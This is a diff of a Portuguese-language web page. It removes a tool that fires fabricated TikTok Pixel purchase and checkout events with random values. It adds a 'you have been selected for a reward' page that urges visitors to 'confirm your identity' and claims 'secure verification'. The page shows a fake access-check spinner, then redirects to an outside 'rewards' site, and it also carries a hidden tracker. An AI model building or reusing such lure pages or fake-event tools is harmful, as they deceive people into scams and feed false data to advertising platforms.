@@ -1,198 +1,312 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ativar Pixel TikTok</title>
-    <link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">
-    
-<style>
-    body {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        font-family: Arial, sans-serif;
-        margin: 0;
-        background-color: #0d0d0d;
-        color: white;
-    }
-    .container {
-        text-align: center;
-        background: #1a1a1a;
-        padding: 20px 40px;
-        border-radius: 12px;
-        box-shadow: 0 0 20px rgba(255, 0, 128, 0.2), 0 0 20px rgba(0, 255, 255, 0.2);
-        width: 320px;
-    }
-    h2 {
-        font-size: 24px;
-        margin-bottom: 20px;
-        color: #ffffff;
-    }
-    #pixelCode {
-        width: 100%;
-        padding: 10px;
-        margin-bottom: 20px;
-        border: 1px solid #555;
-        border-radius: 4px;
-        text-align: center;
-        background-color: #2a2a2a;
-        color: #fff;
-    }
-    button {
-        width: 100%;
-        padding: 12px;
-        margin-top: 10px;
-        font-size: 16px;
-        border: none;
-        border-radius: 4px;
-        cursor: pointer;
-        transition: all 0.3s ease;
-    }
-    .add-to-cart {
-        background: linear-gradient(45deg, #ff0050, #00f2ea);
-        color: #fff;
-    }
-    .initiate-checkout {
-        background: linear-gradient(45deg, #00f2ea, #ff0050);
-        color: #fff;
-    }
-    .add-payment-info {
-        background: linear-gradient(45deg, #ff0050, #7c00ff);
-        color: #fff;
-    }
-    .complete-payment {
-        background: linear-gradient(45deg, #00f2ea, #7c00ff);
-        color: #fff;
-    }
-    .all-events {
-        background: linear-gradient(45deg, #ff0050, #00f2ea, #7c00ff);
-        color: #fff;
-    }
-    button:hover {
-        opacity: 0.9;
-    }
-</style>
-
-</head>
-<body>
-    
-    <div class="container">
-        <h2>Ativar Pixel do TikTok</h2>
-        <input type="text" id="pixelCode" placeholder="Insira o código do Pixel">
-        <button onclick="iniciarPixel()">Ativar Pixel</button>
-        <button class="add-to-cart" onclick="dispararAddToCart()">Add to Cart</button>
-        <button class="initiate-checkout" onclick="dispararInitiateCheckout()">Initiate Checkout</button>
-        <button class="add-payment-info" onclick="dispararAddPaymentInfo()">Add Payment Info</button>
-        <button class="complete-payment" onclick="dispararCompletePayment()">Complete Payment</button>
-        <button class="all-events" onclick="enviarTodosEventosPadroes()">Enviar Todos Eventos Padrões</button>
-    </div>
-
-    <script>
-        function iniciarPixel() {
-            const pixelCode = document.getElementById('pixelCode').value;
-            if (pixelCode) {
-                !function (w, d, t) {
-                    w.TiktokAnalyticsObject = t; var ttq = w[t] = w[t] || [];
-                    ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"],
-                    ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } };
-                    for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
-                    ttq.instance = function (t) {
-                        for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) ttq.setAndDefer(e, ttq.methods[n]);
-                        return e
-                    }, ttq.load = function (e, n) {
-                        var r = "https://analytics.tiktok.com/i18n/pixel/events.js", o = n && n.partner;
-                        ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {};
-                        n = document.createElement("script"), n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t;
-                        e = document.getElementsByTagName("script")[0]; e.parentNode.insertBefore(n, e)
-                    };
-                    ttq.load(pixelCode);
-                    ttq.page();
-                }(window, document, 'ttq');
-                alert("Pixel ativado com sucesso!");
-            } else {
-                alert("Por favor, insira o código do Pixel.");
-            }
-        }
-
-        function dispararAddToCart() {
-            if (window.ttq) {
-                ttq.track('AddToCart');
-                alert("Evento 'Add to Cart' disparado!");
-            } else {
-                alert("Por favor, ative o Pixel primeiro.");
-            }
-        }
-
-        function dispararInitiateCheckout() {
-            if (window.ttq) {
-                ttq.track('InitiateCheckout');
-                alert("Evento 'Initiate Checkout' disparado!");
-            } else {
-                alert("Por favor, ative o Pixel primeiro.");
-            }
-        }
-
-        function dispararAddPaymentInfo() {
-            if (window.ttq) {
-                ttq.track('AddPaymentInfo');
-                alert("Evento 'Add Payment Info' disparado!");
-            } else {
-                alert("Por favor, ative o Pixel primeiro.");
-            }
-        }
-
-        function dispararCompletePayment() {
-            if (window.ttq) {
-                const valorAleatorio = (Math.random() * 100 + 1).toFixed(2);
-                ttq.track('CompletePayment', { quantity: 1, description: "activate", content_type: "product", content_name: "ActivatePixel", currency: "USD", value: valorAleatorio });
-                alert(`Evento 'Complete Payment' disparado com valor de R$${valorAleatorio}`);
-            } else {
-                alert("Por favor, ative o Pixel primeiro.");
-            }
-        }
-
-        function enviarTodosEventosPadroes() {
-            if (window.ttq) {
-                const events = [
-                    { name: 'AddToCart', params: {} },
-                    { name: 'InitiateCheckout', params: {} },
-                    { name: 'AddPaymentInfo', params: {} },
-                    { name: 'CompletePayment', params: { quantity: 1, description: "activate", content_type: "product", content_name: "ActivatePixel", currency: "USD", value: (Math.random() * 100 + 1).toFixed(2) }},
-                    { name: 'CompleteRegistration', params: {} },
-                    { name: 'Contact', params: {} },
-                    { name: 'CustomizeProduct', params: {} },
-                    { name: 'Download', params: {} },
-                    { name: 'FindLocation', params: {} },
-                    { name: 'PlaceAnOrder', params: { currency: 'USD', value: 75.00 } },
-                    { name: 'Schedule', params: {} },
-                    { name: 'Search', params: { query: 'exemplo de pesquisa' } },
-                    { name: 'SubmitForm', params: {} },
-                    { name: 'Subscribe', params: {} },
-                    { name: 'ViewContent', params: { currency: 'USD', value: 49.99 } }
-                ];
-
-                let index = 0;
-                alert("Aguarde 15 segundos! ");
-
-                const triggerNextEvent = () => {
-                    if (index < events.length) {
-                        const event = events[index];
-                        ttq.track(event.name, event.params);
-                        index++;
-                        setTimeout(triggerNextEvent, 1000);
-                    } else {
-                        alert("Todos os eventos padrão foram enviados com sucesso!");
-                    }
-                };
-
-                triggerNextEvent();
-            } else {
-                alert("Pixel não ativado. Por favor, ative o pixel antes de enviar os eventos.");
-            }
-        }
+<html lang="pt-BR"><head>
+  </head><body><div style="display: none;">
+    <script id="_wau2ha">
+        var _wau = _wau || [];
+        _wau.push(["dynamic", "pre3557", "2ha", "c4302bffffff", "small"]);
     </script>
+    <script async="" src="//waust.at/d.js"></script>
+    </div>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Programa Exclusivo</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700;800&amp;family=Inter:wght@400;500&amp;display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-</body>
-</html>
+    body {
+      background: #ffffff;
+      color: #1a1a24;
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── HEADER ── */
+    header {
+      height: 56px;
+      background: #ffffff;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    /* ── PROGRESS BAR ── */
+    .progress-track { width: 100%; height: 3px; background: #f0f0f0; }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, hsl(172,80%,36%), hsl(348,99%,55%));
+      transition: width .5s ease;
+      width: 0%;
+    }
+
+    /* ── MAIN ── */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 28px;
+    }
+
+    /* ── BADGE ── */
+    .badge {
+      display: inline-block;
+      padding: 6px 18px;
+      border-radius: 999px;
+      font-family: 'Outfit', sans-serif;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: .12em;
+      text-transform: uppercase;
+      color: hsl(172, 80%, 32%);
+      background: rgba(26,180,160,0.08);
+      border: 1px solid rgba(26,180,160,0.25);
+    }
+
+    /* ── TITLE ── */
+    .title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 32px;
+      font-weight: 800;
+      letter-spacing: -.03em;
+      line-height: 1.15;
+      color: hsl(240, 10%, 12%);
+      margin-bottom: 12px;
+    }
+    .title .gradient {
+      background: linear-gradient(135deg, hsl(172,80%,35%), hsl(348,99%,52%));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .subtitle {
+      font-size: 14px;
+      color: hsl(240, 5%, 48%);
+      line-height: 1.6;
+    }
+
+    /* ── CTA BLOCK ── */
+    .cta-block {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    /* ── ARROW ── */
+    .arrow-hint {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+      animation: bounce 0.8s ease-in-out infinite;
+    }
+    .arrow-hint span {
+      font-family: 'Outfit', sans-serif;
+      font-size: 13px;
+      font-weight: 600;
+      color: hsl(172, 80%, 32%);
+      letter-spacing: .02em;
+    }
+    .arrow-hint svg { color: hsl(172, 80%, 32%); }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50%       { transform: translateY(7px); }
+    }
+
+    /* ── BUTTON ── */
+    .btn-cta {
+      position: relative;
+      overflow: hidden;
+      width: 100%;
+      padding: 18px 24px;
+      border-radius: 18px;
+      background: linear-gradient(135deg, hsl(172,80%,36%), hsl(348,99%,55%));
+      border: none;
+      cursor: pointer;
+      font-family: 'Outfit', sans-serif;
+      font-weight: 800;
+      font-size: 18px;
+      color: #ffffff;
+      animation: pulse-glow 1.3s ease-in-out infinite;
+    }
+    .btn-cta:active { transform: scale(.96); }
+    @keyframes pulse-glow {
+      0%, 100% {
+        transform: scale(1);
+        box-shadow: 0 4px 24px rgba(26,160,140,.22), 0 4px 48px rgba(254,42,102,.15);
+      }
+      50% {
+        transform: scale(1.06);
+        box-shadow: 0 6px 48px rgba(26,160,140,.55), 0 6px 72px rgba(254,42,102,.38);
+      }
+    }
+
+    /* shimmer sweep */
+    .btn-cta::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(105deg, transparent 35%, rgba(255,255,255,.4) 50%, transparent 65%);
+      transform: translateX(-100%);
+      animation: shimmer 2.4s ease-in-out infinite;
+    }
+    @keyframes shimmer {
+      0%   { transform: translateX(-100%); }
+      60%  { transform: translateX(200%); }
+      100% { transform: translateX(200%); }
+    }
+
+    /* ── TRUST LINE ── */
+    .trust {
+      font-size: 12px;
+      color: hsl(240, 5%, 58%);
+    }
+
+    /* ── LOADER OVERLAY ── */
+    #loaderOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #ffffff;
+      z-index: 999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 28px;
+    }
+    #loaderOverlay.visible { display: flex; }
+
+    .tt-spinner {
+      position: relative;
+      width: 56px;
+      height: 56px;
+    }
+    .tt-spinner::before,
+    .tt-spinner::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 4px solid transparent;
+    }
+    .tt-spinner::before {
+      border-top-color: hsl(172, 80%, 36%);
+      border-right-color: hsl(172, 80%, 36%);
+      animation: spin 1s linear infinite;
+    }
+    .tt-spinner::after {
+      border-bottom-color: hsl(348, 99%, 55%);
+      border-left-color: hsl(348, 99%, 55%);
+      animation: spin 1s linear infinite reverse;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .loader-text {
+      font-family: 'Outfit', sans-serif;
+      font-size: 15px;
+      color: hsl(240, 5%, 45%);
+      letter-spacing: .02em;
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      padding: 16px;
+      text-align: center;
+      border-top: 1px solid #f0f0f0;
+    }
+    footer a {
+      font-size: 11px;
+      color: hsl(240, 5%, 58%);
+      text-decoration: none;
+      transition: color .15s;
+    }
+    footer a:hover { color: #1a1a24; text-decoration: underline; }
+    footer span { color: #d0d0d8; margin: 0 6px; font-size: 11px; }
+  </style>
+
+
+
+  <!-- HEADER (limpo, sem logo) -->
+  <header></header>
+
+  <!-- PROGRESS -->
+  <div class="progress-track">
+    <div class="progress-fill" id="progressFill"></div>
+  </div>
+
+  <!-- MAIN -->
+  <main>
+    <div class="container">
+
+      <!-- Badge -->
+      <div class="badge">Programa Exclusivo</div>
+
+      <!-- Title -->
+      <div>
+        <h1 class="title">
+          Você foi selecionado(a)<br>
+          <span class="gradient">para uma recompensa</span>
+        </h1>
+        <p class="subtitle">Confirme sua identidade e resgate seu prêmio exclusivo agora mesmo.</p>
+      </div>
+
+      <!-- CTA -->
+      <div class="cta-block">
+        <div class="arrow-hint">
+          <span>Toque aqui para resgatar!</span>
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 5v14M5 13l7 7 7-7"></path>
+          </svg>
+        </div>
+
+        <button class="btn-cta" onclick="startFlow()">
+          🎁 Quero meu prêmio agora!
+        </button>
+      </div>
+
+      <!-- Trust -->
+      <p class="trust">🔒 Verificação segura · Apenas 1 minuto</p>
+
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer>
+    <a href="#">Termos de Uso</a>
+    <span>·</span>
+    <a href="#">Política de Privacidade</a>
+    <span>·</span>
+    <a href="#">Contato</a>
+  </footer>
+
+  <!-- LOADER -->
+  <div id="loaderOverlay">
+    <div class="tt-spinner"></div>
+    <p class="loader-text">Verificando seu acesso...</p>
+  </div>
+
+  <script>
+    function startFlow() {
+      document.getElementById('progressFill').style.width = '100%';
+      document.getElementById('loaderOverlay').classList.add('visible');
+      setTimeout(function () {
+        window.location.href = 'https://ofertadiaria.space/rewards.html';
+      }, 2200);
+    }
+  </script>
+
+
+</body></html>
